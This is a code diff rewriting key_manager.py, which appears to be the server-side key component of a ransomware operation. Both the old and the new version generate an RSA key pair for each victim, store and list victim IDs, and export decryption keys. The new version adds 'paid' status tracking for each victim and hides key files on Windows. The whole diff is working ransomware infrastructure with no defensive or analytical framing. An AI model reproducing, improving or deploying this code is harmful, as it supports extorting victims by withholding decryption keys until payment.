@@ -1,209 +1,227 @@
-# key_manager.py - RSA Key Management
 import os
 import json
 import time
-
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-import base64
+import hashlib
+import secrets
+import stat
 
 
-class KeyManager:
-    def __init__(self, key_dir="keys"):
-        self.key_dir = key_dir
-        self.private_key = None
-        self.public_key = None
-        self.victim_keys = {}  # Store victim-specific keys
+try:
+    #Cryptodome
+    from Cryptodome.PublicKey import RSA
+    CRYPTO_LIB = "cryptodome"
+except ImportError:
+    try:
+        # cryptography
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.backends import default_backend
+        CRYPTO_LIB = "cryptography"
+    except ImportError:
+        raise ImportError("Install either: pip install pycryptodome OR pip install cryptography")
 
-        # Ensure key directory exists
-        os.makedirs(self.key_dir, exist_ok=True)
+KEYS_FOLDER = "keys"
 
-    def generate_rsa_keypair(self, key_size=4096):
-        """Generate RSA key pair"""
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=key_size,
-            backend=default_backend()
-        )
-
-        public_key = private_key.public_key()
-
-        # Serialize keys
-        private_pem = private_key.private_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PrivateFormat.PKCS8,
-            encryption_algorithm=serialization.NoEncryption()
-        )
-
-        public_pem = public_key.public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
-        )
-
-        return private_pem, public_pem
-
-    def load_server_keys(self):
-        """Load or generate server keys"""
-        private_key_path = os.path.join(self.key_dir, "server_private.pem")
-        public_key_path = os.path.join(self.key_dir, "server_public.pem")
-
+def setup():
+    if not os.path.exists(KEYS_FOLDER):
         try:
-            if os.path.exists(private_key_path) and os.path.exists(public_key_path):
-                with open(private_key_path, "rb") as f:
-                    self.private_key = f.read()
-                with open(public_key_path, "rb") as f:
-                    self.public_key = f.read()
-                print("[+] Loaded existing server keys")
-            else:
-                self.private_key, self.public_key = self.generate_rsa_keypair()
-                with open(private_key_path, "wb") as f:
-                    f.write(self.private_key)
-                with open(public_key_path, "wb") as f:
-                    f.write(self.public_key)
-                print("[+] Generated new server RSA key pair")
-
-            return True
+            os.makedirs(KEYS_FOLDER, exist_ok=True)
+           
+            if os.name == 'posix':
+                os.chmod(KEYS_FOLDER, stat.S_IRWXU) 
         except Exception as e:
-            print(f"[-] Key loading error: {e}")
-            return False
+            raise Exception(f"Cannot create keys folder: {e}")
 
-    def generate_victim_keypair(self, victim_id):
-        """Generate unique key pair for a victim"""
-        private_pem, public_pem = self.generate_rsa_keypair()
-
-        # Store victim keys
-        self.victim_keys[victim_id] = {
-            'private_key': private_pem,
-            'public_key': public_pem,
-            'generated_at': time.time()
-        }
-
-        # Save to file
-        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
-        with open(victim_key_path, 'w') as f:
-            json.dump({
-                'victim_id': victim_id,
-                'private_key': private_pem.decode('utf-8'),
-                'public_key': public_pem.decode('utf-8'),
-                'generated_at': time.time()
-            }, f, indent=2)
-
-        return public_pem
-
-    def get_victim_private_key(self, victim_id):
-        """Get private key for specific victim"""
-        if victim_id in self.victim_keys:
-            return self.victim_keys[victim_id]['private_key']
-
-        # Try to load from file
-        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
-        if os.path.exists(victim_key_path):
-            try:
-                with open(victim_key_path, 'r') as f:
-                    key_data = json.load(f)
-                    return key_data['private_key'].encode('utf-8')
-            except Exception as e:
-                print(f"[-] Error loading victim key: {e}")
-
-        return None
-
-    def get_victim_public_key(self, victim_id):
-        """Get public key for specific victim"""
-        if victim_id in self.victim_keys:
-            return self.victim_keys[victim_id]['public_key']
-
-        # Try to load from file
-        victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
-        if os.path.exists(victim_key_path):
-            try:
-                with open(victim_key_path, 'r') as f:
-                    key_data = json.load(f)
-                    return key_data['public_key'].encode('utf-8')
-            except Exception as e:
-                print(f"[-] Error loading victim public key: {e}")
-
-        return None
-
-    def list_victim_keys(self):
-        """List all stored victim keys"""
-        victim_keys = []
-        for filename in os.listdir(self.key_dir):
-            if filename.startswith("victim_") and filename.endswith(".json"):
-                victim_id = filename[7:-5]  # Remove "victim_" and ".json"
-                victim_keys.append(victim_id)
-        return victim_keys
-
-    def export_decryption_key(self, victim_id, output_path=None):
-        """Export decryption key for a victim"""
-        private_key = self.get_victim_private_key(victim_id)
-        if not private_key:
-            print(f"[-] No key found for victim {victim_id}")
-            return False
-
-        if not output_path:
-            output_path = f"decryption_key_{victim_id}.pem"
-
-        try:
-            with open(output_path, "wb") as f:
-                f.write(private_key)
-            print(f"[+] Decryption key exported to {output_path}")
-            return True
-        except Exception as e:
-            print(f"[-] Export error: {e}")
-            return False
-
-    def import_victim_key(self, victim_id, private_key_pem):
-        """Import existing victim key"""
-        try:
-            # Validate the key
-            private_key = serialization.load_pem_private_key(
-                private_key_pem,
-                password=None,
+def make_key():
+    try:
+        if CRYPTO_LIB == "cryptodome":
+            key = RSA.generate(4096)
+            private_key = key.export_key()
+            public_key = key.publickey().export_key()
+            return private_key, public_key
+        else:  # cryptography
+            private_key = rsa.generate_private_key(
+                public_exponent=65537,
+                key_size=4096,
                 backend=default_backend()
             )
+            public_key = private_key.public_key()
+            
+            private_pem = private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            )
+            
+            public_pem = public_key.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+            
+            return private_pem, public_pem
+    except Exception as e:
+        raise Exception(f"Key generation failed: {e}")
 
-            # Store the key
-            self.victim_keys[victim_id] = {
-                'private_key': private_key_pem,
-                'public_key': private_key.public_key().public_bytes(
-                    encoding=serialization.Encoding.PEM,
-                    format=serialization.PublicFormat.SubjectPublicKeyInfo
-                ),
-                'imported_at': time.time()
-            }
+def make_server_key():
+    setup()
+    
+    private_path = f"{KEYS_FOLDER}/server_private.pem"
+    public_path = f"{KEYS_FOLDER}/server_public.pem"
+    
+    if os.path.exists(private_path) and os.path.exists(public_path):
+        with open(public_path, "rb") as f:
+            return f.read()
+    
+    private, public = make_key()
+    
+    try:
+        with open(private_path, "wb") as f:
+            f.write(private)
+        with open(public_path, "wb") as f:
+            f.write(public)
+        
+        secure_file(private_path)
+        secure_file(public_path)
+        
+        return public
+    except Exception as e:
+        raise Exception(f"Cannot save server keys: {e}")
 
-            # Save to file
-            victim_key_path = os.path.join(self.key_dir, f"victim_{victim_id}.json")
-            with open(victim_key_path, 'w') as f:
-                json.dump({
-                    'victim_id': victim_id,
-                    'private_key': private_key_pem.decode('utf-8'),
-                    'public_key': self.victim_keys[victim_id]['public_key'].decode('utf-8'),
-                    'imported_at': time.time()
-                }, f, indent=2)
+def make_victim_key(victim_id):
+    setup()
+    
+    victim_file = f"{KEYS_FOLDER}/victim_{victim_id}.json"
+    if os.path.exists(victim_file):
+        with open(victim_file, "r", encoding='utf-8') as f:
+            data = json.load(f)
+        return data["public_key"].encode('utf-8')
+    
+    private, public = make_key()
+    
+    key_data = {
+        "victim_id": victim_id,
+        "private_key": private.decode('utf-8'),
+        "public_key": public.decode('utf-8'),
+        "created": time.time(),
+        "paid": False,
+        "paid_time": None
+    }
+    
+    try:
+        with open(victim_file, "w", encoding='utf-8') as f:
+            json.dump(key_data, f, indent=2)
+        
+        secure_file(victim_file)
+        return public
+    except Exception as e:
+        raise Exception(f"Cannot save victim key: {e}")
 
-            print(f"[+] Successfully imported key for victim {victim_id}")
-            return True
+def get_key(victim_id, key_type="private"):
+    filename = f"{KEYS_FOLDER}/victim_{victim_id}.json"
+    
+    if not os.path.exists(filename):
+        return None
+    
+    try:
+        with open(filename, "r", encoding='utf-8') as f:
+            data = json.load(f)
+        
+        if key_type == "private":
+            return data["private_key"].encode('utf-8')
+        else:
+            return data["public_key"].encode('utf-8')
+    except Exception as e:
+        print(f"Error reading key: {e}")
+        return None
 
-        except Exception as e:
-            print(f"[-] Key import error: {e}")
-            return False
+def mark_paid(victim_id):
+    filename = f"{KEYS_FOLDER}/victim_{victim_id}.json"
+    
+    if not os.path.exists(filename):
+        return False
+    
+    try:
+        with open(filename, "r", encoding='utf-8') as f:
+            data = json.load(f)
+        
+        data["paid"] = True
+        data["paid_time"] = time.time()
+        
+        with open(filename, "w", encoding='utf-8') as f:
+            json.dump(data, f, indent=2)
+        
+        return True
+    except Exception as e:
+        print(f"Error marking as paid: {e}")
+        return False
 
-    def get_server_public_key(self):
-        """Get server public key"""
-        return self.public_key
+def list_victims():
+    if not os.path.exists(KEYS_FOLDER):
+        return []
+    
+    victims = []
+    for file in os.listdir(KEYS_FOLDER):
+        if file.startswith("victim_") and file.endswith(".json"):
+            victim_id = file[7:-5]
+            
+            try:
+                with open(f"{KEYS_FOLDER}/{file}", "r", encoding='utf-8') as f:
+                    data = json.load(f)
+                
+                victims.append({
+                    "id": victim_id,
+                    "created": data.get("created", 0),
+                    "paid": data.get("paid", False),
+                    "paid_time": data.get("paid_time")
+                })
+            except Exception:
+                continue
+    
+    return victims
 
-    def get_server_private_key(self):
-        """Get server private key"""
-        return self.private_key
+def export_key(victim_id):
+    private_key = get_key(victim_id, "private")
+    if not private_key:
+        return False
+    
+    export_folder = "exported_keys"
+    try:
+        os.makedirs(export_folder, exist_ok=True)
+    except Exception as e:
+        print(f"Error creating export folder: {e}")
+        return False
+    
+    filename = f"{export_folder}/{victim_id}_key.pem"
+    try:
+        with open(filename, "wb") as f:
+            f.write(private_key)
+        
+        secure_file(filename)
+        return True
+    except Exception as e:
+        print(f"Error exporting key: {e}")
+        return False
 
+def make_victim_id(ip="0.0.0.0"):
+    unique_text = f"{ip}_{time.time()}_{secrets.randbelow(1000000)}_{os.urandom(8).hex()}"
+    victim_id = hashlib.sha256(unique_text.encode()).hexdigest()[:16]
+    return victim_id
 
-# Utility function for victim ID generation
-def generate_victim_id(ip_address, machine_info=""):
-    """Generate unique victim ID"""
-    import hashlib
-    unique_string = f"{ip_address}_{machine_info}_{time.time()}"
-    return hashlib.md5(unique_string.encode()).hexdigest()[:12]
+def secure_file(filepath):
+    try:
+        if os.name == 'posix':  # Linux/Mac
+            os.chmod(filepath, stat.S_IRUSR | stat.S_IWUSR)  
+        elif os.name == 'nt':  # Windows
+            try:
+             
+                os.system(f'attrib +h "{filepath}"')
+            except:
+                pass  
+        return True
+    except:
+        return False
+
+def auto_setup():
+    setup()
+    make_server_key()
+
